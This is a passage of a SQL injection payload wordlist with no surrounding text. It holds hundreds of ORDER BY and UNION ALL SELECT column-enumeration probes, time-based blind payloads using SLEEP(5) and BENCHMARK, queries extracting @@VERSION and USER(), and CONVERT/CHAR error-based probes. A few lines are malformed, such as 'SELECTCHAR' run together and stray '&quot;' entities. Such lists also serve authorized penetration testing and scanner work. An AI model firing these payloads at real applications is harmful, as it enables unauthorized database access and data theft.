1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION ALL SELECT 1\n UNION ALL SELECT 1,2\n UNION ALL SELECT 1,2,3\n UNION ALL SELECT 1,2,3,4\n UNION ALL SELECT 1,2,3,4,5\n UNION ALL SELECT 1,2,3,4,5,6\n UNION ALL SELECT 1,2,3,4,5,6,7\n UNION ALL SELECT 1,2,3,4,5,6,7,8\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION ALL SELECT 1#\n UNION ALL SELECT 1,2#\n UNION ALL SELECT 1,2,3#\n UNION ALL SELECT 1,2,3,4#\n UNION ALL SELECT 1,2,3,4,5#\n UNION ALL SELECT 1,2,3,4,5,6#\n UNION ALL SELECT 1,2,3,4,5,6,7#\n UNION ALL SELECT 1,2,3,4,5,6,7,8#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n UNION ALL SELECT 1-- \n UNION ALL SELECT 1,2-- \n UNION ALL SELECT 1,2,3-- \n UNION ALL SELECT 1,2,3,4-- \n UNION ALL SELECT 1,2,3,4,5-- \n UNION ALL SELECT 1,2,3,4,5,6-- \n UNION ALL SELECT 1,2,3,4,5,6,7-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \n UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \n UNION SELECT @@VERSION,SLEEP(5),3\n UNION SELECT @@VERSION,SLEEP(5),USER(),4\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION SELECT @@VERSION,SLEEP(5),&quot;'3\n UNION SELECT @@VERSION,SLEEP(5),&quot;'3'&quot;#\n UNION SELECT @@VERSION,SLEEP(5),USER(),4#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n UNION ALL SELECT USER()-- \n UNION ALL SELECT SLEEP(5)-- \n UNION ALL SELECT USER(),SLEEP(5)-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT NULL-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- \n UNION ALL SELECT NULL#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#\n 